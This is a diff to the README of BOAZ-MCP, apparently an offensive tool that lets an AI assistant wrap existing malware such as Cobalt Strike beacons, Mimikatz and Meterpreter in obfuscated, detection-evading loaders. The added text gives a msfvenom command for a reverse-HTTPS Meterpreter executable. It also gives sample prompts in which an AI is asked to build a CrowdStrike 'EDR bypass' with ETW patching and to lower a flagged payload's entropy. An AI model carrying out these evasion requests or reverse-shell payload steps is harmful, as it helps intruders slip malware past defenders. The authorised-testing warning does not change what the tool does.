@@ -23,6 +23,55 @@ Simply describe your requirements to an AI assistant, and BOAZ-MCP handles the t
 
 > **WARNING**: For authorised security testing only. Obtain written permission before use. Users are responsible for legal compliance.
 
+## What BOAZ Does (Important!)
+
+**BOAZ is NOT a malware generator - it's a malware wrapper and obfuscator.**
+
+### How It Works:
+
+1. **You provide an existing payload** (INPUT):
+   - Cobalt Strike beacon.exe
+   - Mimikatz.exe
+   - Meterpreter executable
+   - Sliver implant
+   - Any Windows PE file you want to make evasive
+
+2. **BOAZ wraps and obfuscates it**:
+   - Converts your payload to shellcode
+   - Encodes it (AES, UUID, etc.)
+   - Creates a new loader with evasion techniques
+   - Applies LLVM obfuscation
+   - Adds anti-analysis features
+
+3. **Output: Evasive version** (OUTPUT):
+   - Your original payload, now harder to detect
+   - Wrapped in advanced evasion techniques
+   - Ready for testing
+
+### What You Need Before Using BOAZ:
+
+**Required:**
+- Your own malicious payload (beacon.exe, mimikatz.exe, meterpreter, etc.)
+- Or use the included `notepad.exe` for testing the framework
+
+**Generating Test Payloads:**
+```bash
+# Meterpreter (using Metasploit)
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o payload.exe
+
+# Cobalt Strike (using CS teamserver)
+# Generate beacon via Cobalt Strike GUI
+
+# Mimikatz
+# Download from https://github.com/gentilkiwi/mimikatz/releases
+```
+
+**Testing Without Malware:**
+BOAZ includes `notepad.exe` for testing. Use this to verify BOAZ works before using real payloads:
+```bash
+python3 Boaz.py -f notepad.exe -o output/test.exe -l 16 -e uuid
+```
+
 ## Setup
 
 ### Prerequisites
@@ -65,31 +114,47 @@ BOAZ-MCP is designed for natural language interaction. Simply describe what you 
 
 ### Basic Payload Generation
 ```
-"Generate a basic evasive payload from beacon.exe"
+"I have beacon.exe from my Cobalt Strike server.
+Generate a basic evasive version."
 ```
+AI wraps your beacon.exe with loader 16 + UUID encoding.
 
 ### Advanced Obfuscation
 ```
-"Create a payload with LLVM obfuscation for maximum stealth"
+"I have mimikatz.exe. Create a version with LLVM obfuscation
+for maximum stealth."
 ```
+AI wraps your mimikatz.exe with Akira compiler + advanced obfuscation.
 
 ### EDR Evasion
 ```
-"I'm targeting CrowdStrike. Generate a payload with memory guard loaders,
-AES encoding, ETW patching, and anti-emulation checks"
+"I'm targeting CrowdStrike with my meterpreter payload.
+Generate an EDR bypass with memory guard loaders, AES encoding,
+ETW patching, and anti-emulation checks."
 ```
+AI wraps your meterpreter with loader 51 + AES + full evasion suite.
+
+### Testing BOAZ (No Real Malware)
+```
+"I want to test BOAZ. Use the included notepad.exe
+to verify it works."
+```
+AI wraps the safe notepad.exe to verify BOAZ is working properly.
 
 ### Entropy Optimisation
 ```
-"My payload has high entropy. Can you help optimise it?"
+"My wrapped payload has high entropy and keeps getting flagged.
+Can you help optimise it?"
 ```
+AI analyses and regenerates with entropy reduction.
 
 ### Loader Discovery
 ```
 "Show me all threadless injection loaders"
 ```
+AI lists available loaders by category.
 
-The AI assistant will configure appropriate loaders, encoders, obfuscation techniques, and evasion features based on your requirements.
+**Remember:** You must provide your own malicious payload as input (beacon.exe, mimikatz.exe, etc.), or use the included `notepad.exe` for testing.
 
 ## Available MCP Tools
 
